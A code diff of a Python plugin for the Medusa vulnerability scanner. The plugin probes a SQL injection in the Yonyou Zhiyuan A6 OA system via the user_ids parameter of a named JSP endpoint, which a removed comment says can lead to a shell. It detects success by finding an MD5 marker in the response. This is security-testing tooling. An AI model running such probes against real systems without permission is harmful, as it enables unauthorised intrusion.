@@ -1,14 +1,23 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
-'''
-name: 用友致远A6协同系统SQL注射union可shell
-referer: http://www.wooyun.org/bugs/wooyun-2015-0106478
-author: Lucifer
-description: /yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?参数user_ids存在注入,可GETSHELL。
-'''
+
 import urllib
 import requests
-
+import ClassCongregation
+class VulnerabilityInfo(object):
+    def __init__(self,Medusa):
+        self.info = {}
+        self.info['number'] = "0"  # 如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
+        self.info['author'] = "Ascotbe"  # 插件作者
+        self.info['create_date'] = "2019-10-13"  # 插件编辑时间
+        self.info['disclosure']='2019-10-13'#漏洞披露时间，如果不知道就写编写插件的时间
+        self.info['algroup'] = "Seeyou_user_ids_sqli"  # 插件名称
+        self.info['name'] ='' #漏洞名称
+        self.info['affects'] = "用友OA"  # 漏洞组件
+        self.info['desc_content'] = "用友OA_user_ids文件存在sql注入漏洞"  # 漏洞描述
+        self.info['rank'] = "高危"  # 漏洞等级
+        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
+        self.info['details'] = Medusa  # 结果
 def UrlProcessing(url):
     if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
         res = urllib.parse.urlparse(url)
@@ -29,7 +38,7 @@ def medusa(Url,RandomAgent,ProxyIp):
     global resp
     global resp2
     try:
-        payload_url = scheme+"://"+url+payload
+        payload_url = scheme+"://"+url+ ':' + str(port)+payload
         headers = {
             'Accept-Encoding': 'gzip, deflate',
             'Accept': '*/*',
@@ -47,7 +56,11 @@ def medusa(Url,RandomAgent,ProxyIp):
         con = resp.text
         code = resp.status_code
         if  con.lower().find('81dc9bdb52d04dc20036dbd8313ed055')!=-1:
-            Medusa = "{} 存在用友致远A6 SQL注入漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
-            return (Medusa)
-    except Exception as e:
-        pass
+            Medusa = "{} \r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
+            _t = VulnerabilityInfo(Medusa)
+            web = ClassCongregation.VulnerabilityDetails(_t.info)
+            web.High()  # serious表示严重，High表示高危，Intermediate表示中危，Low表示低危
+            return (_t.info)
+    except:
+        _ = VulnerabilityInfo('').info.get('algroup')
+        _l = ClassCongregation.ErrorLog().Write(url, _)  # 调用写入类
